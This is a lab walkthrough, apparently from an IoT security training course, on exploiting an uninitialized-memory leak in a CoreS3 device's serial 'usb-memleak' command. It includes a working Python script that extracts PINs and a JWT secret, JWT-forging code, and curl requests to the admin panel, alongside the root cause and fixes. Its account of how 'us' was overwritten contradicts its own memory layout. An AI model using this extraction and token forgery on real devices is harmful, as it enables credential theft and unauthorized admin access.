# L26: Uninitialized Memory Leak

## Goal
Extract sensitive data (user PIN, admin PIN, JWT secret) from an uninitialized stack buffer leaked via the serial console's `usb-memleak` command.

## Background

**Why this matters**: Serial commands that return uninitialized memory buffers can leak encryption keys, passwords, and configuration secrets. This vulnerability class (CWE-908) is common in embedded systems where developers skip buffer zeroing for performance or by oversight.

**What you're looking for in IoT devices:**
- Serial commands that return data structures without clearing buffers first
- Status or diagnostic commands that dump raw memory contents
- Buffer reuse without zeroing between operations
- Diagnostic interfaces that expose raw struct contents

**Why this happens:**
- C/C++ does not zero-initialize local variables by default
- Stack buffers contain leftover data from previous function calls
- `malloc()` returns uninitialized memory (unlike `calloc()`)
- Developers initialize some struct fields but forget `reserved` or padding fields
- Struct padding bytes inserted by the compiler are never explicitly initialized

**On CoreS3**: The `usb-memleak` command creates a `UsbStatus` struct on the stack with a 62-byte `reserved` field. Only `status` and `version` (2 bytes) are initialized. The firmware copies sensitive config data (user_pin, admin_pin, JWT secret) into the `reserved` field and dumps the entire 64-byte struct as hex over serial.

**Vulnerable pattern:**
```cpp
struct UsbStatus {
    uint8_t status;       // Byte 0: initialized to 0x01
    uint8_t version;      // Byte 1: initialized to 0x01
    uint8_t reserved[62]; // Bytes 2-63: NOT zeroed!
};

UsbStatus reply;          // Allocated on stack (uninitialized)
reply.status = 0x01;      // Only 2 bytes initialized
reply.version = 0x01;
// reserved[62] contains old stack data - leaked via serial hex dump
```

**Memory layout:**
```
Stack frame for usbMemLeak():
+--------+--------+--------------------------------------------+
| status | version|              reserved[62]                   |
| (0x01) | (0x01) | <-- contains secrets from memcpy -->       |
+--------+--------+--------------------------------------------+
  Byte 0   Byte 1   Bytes 2-63 (NOT zeroed before use)

The firmware copies into reserved[] via memcpy:
"user_pin=1234;admin_pin=5678;jwt=<secret>"
```

## Hardware Setup

**What you need:**
- CoreS3 device connected via USB-C cable
- Linux machine with Python 3 and `pyserial` (`pip install pyserial`)
- Terminal emulator: `pio device monitor`, `screen`, or `minicom`

```bash
pip install pyserial
# PlatformIO monitor is built-in, no extra install needed
# Alternatively: sudo apt install -y screen minicom

ls -la /dev/ttyACM*
# Expected: /dev/ttyACM0 (USB CDC serial)
```

## Lab Walkthrough

### Step 1: Connect to USB Serial Console

Establish a serial connection and verify command access.

```bash
lsusb
# Expected: Bus 001 Device 005: ID 303a:1001 Espressif

pio device monitor -b 115200

# Press Enter to get the prompt
cores3-cam>

# The usb-memleak command is NOT listed in help output.
# Discover it through firmware RE (L04/L05) or:
# $ strings firmware.bin | grep -i usb
# usb-memleak
# usb-auth
# usb-cmd
# usb-dfu
```

### Step 2: Trigger the Memory Leak

Send `usb-memleak` to dump the uninitialized buffer. Bytes 0-1 are initialized (`status`, `version`); bytes 2-63 contain leaked secrets.

```bash
cores3-cam> usb-memleak

# Expected output:
# [USB-MEM] USB control transfer status buffer:
#
# 01 01 65 72 5F 70 69 6E 3D 31 32 33 34 3B 61 64
# 6D 69 6E 5F 70 69 6E 3D 35 36 37 38 3B 6A 77 74
# 3D 73 65 63 72 65 74 31 32 33 00 00 00 00 00 00
# 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

- `01 01` - `status=0x01`, `version=0x01` (initialized fields, overwrite first 2 bytes)
- `65 72 5F 70 69 6E 3D ...` - Leaked data from `reserved[62]` ("er_pin=..." - the "us" of "user_pin" was overwritten by status/version bytes)

### Step 3: Decode the Leaked Data

Convert hex to ASCII to extract plaintext secrets.

```bash
python3 << 'EOF'
# Paste the hex bytes from serial output (skip first 2 bytes)
hex_data = "65 72 5F 70 69 6E 3D 31 32 33 34 3B 61 64 6D 69 6E 5F 70 69 6E 3D 35 36 37 38 3B 6A 77 74 3D"

raw = bytes.fromhex(hex_data.replace(" ", ""))
decoded = raw.decode('utf-8', errors='ignore')
print(f"Decoded leaked data: {decoded}")

# Note: first 2 bytes ("us") of "user_pin" were overwritten by status/version
# The leaked string starts at "er_pin=..." - reconstruct the full credential
for pair in decoded.split(';'):
    if '=' in pair:
        key, value = pair.split('=', 1)
        print(f"  {key}: {value}")

# Expected output:
# Decoded leaked data: er_pin=1234;admin_pin=5678;jwt=<REDACTED>
#   er_pin: 1234        (was "user_pin" - "us" overwritten by status/version)
#   admin_pin: 5678
#   jwt: <REDACTED>
EOF
```

### Step 4: Automate the Capture and Decode

Script the full exploit for reliable, fast extraction (under 2 seconds).

```python
#!/usr/bin/env python3
"""usb_memleak_exploit.py - Extract secrets from USB memory leak.

Usage: python3 usb_memleak_exploit.py
"""
import serial
import re
import time
import sys

PORT = '/dev/ttyACM0'
BAUD = 115200

ser = serial.Serial(PORT, BAUD, timeout=3)
time.sleep(1)
ser.read(ser.in_waiting)

print("[*] Sending usb-memleak command...")
ser.write(b'usb-memleak\r\n')

time.sleep(1)
output = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"[*] Raw output:\n{output}")

# Extract hex bytes from the output
hex_pattern = r'([0-9A-Fa-f]{2}(?:\s+[0-9A-Fa-f]{2})+)'
hex_matches = re.findall(hex_pattern, output)

if not hex_matches:
    print("[-] No hex data found in output")
    ser.close()
    sys.exit(1)

all_hex = ' '.join(hex_matches)
hex_bytes = [int(h, 16) for h in all_hex.split()]

print(f"\n[*] Total bytes captured: {len(hex_bytes)}")
print(f"[*] Status byte: 0x{hex_bytes[0]:02X}")
print(f"[*] Version byte: 0x{hex_bytes[1]:02X}")

# Skip first 2 bytes (status, version) and decode the rest
leaked_bytes = bytes(hex_bytes[2:])
leaked_str = leaked_bytes.decode('utf-8', errors='ignore').rstrip('\x00')
print(f"\n[+] Leaked data: {leaked_str}")

print("\n[+] Extracted secrets:")
for pair in leaked_str.split(';'):
    pair = pair.strip()
    if '=' in pair:
        key, value = pair.split('=', 1)
        print(f"    {key} = {value}")

ser.close()
print("\n[+] Memory leak exploit complete.")
```

```bash
python3 usb_memleak_exploit.py

# Expected output:
# [*] Sending usb-memleak command...
# [*] Raw output:
# [USB-MEM] USB control transfer status buffer:
#
# 01 01 65 72 5F 70 69 6E 3D 31 32 33 34 3B 61 64 ...
#
# [*] Total bytes captured: 64
# [*] Status byte: 0x01
# [*] Version byte: 0x01
#
# [+] Leaked data: er_pin=1234;admin_pin=5678;jwt=<REDACTED>
#
# [+] Extracted secrets:
#     er_pin = 1234      (was "user_pin" - "us" overwritten by status/version)
#     admin_pin = 5678
#     jwt = <REDACTED>
#
# [+] Memory leak exploit complete.
```

### Step 5: Verify the Leaked Credentials

Use the extracted secrets to authenticate, proving the leak contains valid credentials.

```bash
# Test the leaked user PIN
curl -s http://192.168.4.1/api/check_pin -X POST \
  -d 'pin=1234'

# Expected: OK

# Forge a JWT token using the leaked secret
python3 << 'EOF'
import hmac, hashlib, base64, json

jwt_secret = "<REDACTED>"  # Replace with actual leaked value

header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","iat":1709000000}).encode()).rstrip(b'=')

signing_input = header + b'.' + payload
signature = base64.urlsafe_b64encode(
    hmac.new(jwt_secret.encode(), signing_input, hashlib.sha256).digest()
).rstrip(b'=')

token = (signing_input + b'.' + signature).decode()
print(f"Forged JWT: {token}")
EOF

# Use the forged JWT to access the admin panel
curl -s http://192.168.4.1/admin \
  -H "Authorization: Bearer <forged_jwt_token>"

# Expected: Admin panel HTML (access granted with forged token)
```

### Step 6: Analyze the Root Cause

The fix is straightforward - zero the buffer before use - but the vulnerability is common because C/C++ does not zero-initialize stack variables.

```
Vulnerable code pattern:
  struct UsbStatus reply;         // Stack allocation - NOT zeroed
  reply.status = 0x01;            // Only 2 of 64 bytes initialized
  reply.version = 0x01;
  // reply.reserved[62] contains whatever was on the stack
  // Then dump ALL 64 bytes including uninitialized reserved[]

Fix: Zero the entire struct before partial initialization:
  struct UsbStatus reply;
  memset(&reply, 0, sizeof(reply));   // Zero ALL fields first
  reply.status = 0x01;
  reply.version = 0x01;

Alternative fix: Aggregate initialization (C++):
  UsbStatus reply = {};               // Zero-initializes all fields
  reply.status = 0x01;
  reply.version = 0x01;
```

Comparable real-world bugs: Heartbleed (CVE-2014-0160) leaked server memory through uninitialized heap reads. USB control transfer descriptors in consumer devices have leaked stack data containing WiFi credentials.

### Step 7: Repeat and Compare Outputs

Run `usb-memleak` multiple times - output may vary depending on prior stack contents, demonstrating the non-deterministic nature of stack residue leaks.

```bash
for i in 1 2 3; do
    echo "=== Run $i ==="
    python3 -c "
import serial, time
ser = serial.Serial('/dev/ttyACM0', 115200, timeout=2)
time.sleep(0.5)
ser.read(ser.in_waiting)
ser.write(b'usb-memleak\r\n')
time.sleep(1)
print(ser.read(ser.in_waiting).decode('utf-8', errors='ignore'))
ser.close()
"
    sleep 1
done
```

## Impact

- **Complete credential extraction**: User PIN, admin PIN, and JWT secret extracted with a single unauthenticated serial command.
- **JWT forgery**: Leaked JWT secret allows forging admin tokens for all protected endpoints.
- **PIN bypass**: Leaked PINs bypass touchscreen lock and admin panel authentication.
- **Zero interaction**: No user interaction required; USB access only; entire exploit takes under 2 seconds.
- **No authentication on serial**: The `usb-memleak` command executes without prior authentication.
- **Real-world parallel**: CVE-2014-0160 (Heartbleed) leaked server memory through a similar uninitialized buffer read. USB HID descriptors in consumer devices have leaked WiFi credentials and debug information.

## References

- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-908: Use of Uninitialized Resource](https://cwe.mitre.org/data/definitions/908.html)
- [CWE-459: Incomplete Cleanup](https://cwe.mitre.org/data/definitions/459.html)
- [CWE-226: Sensitive Information in Resource Not Removed Before Reuse](https://cwe.mitre.org/data/definitions/226.html)
- [CVE-2014-0160 - Heartbleed](https://heartbleed.com/)
- [CERT C Rule MSC06-C: Beware of compiler optimizations](https://wiki.sei.cmu.edu/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations)
- [ESP32 Memory Layout](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/system/mem_alloc.html)
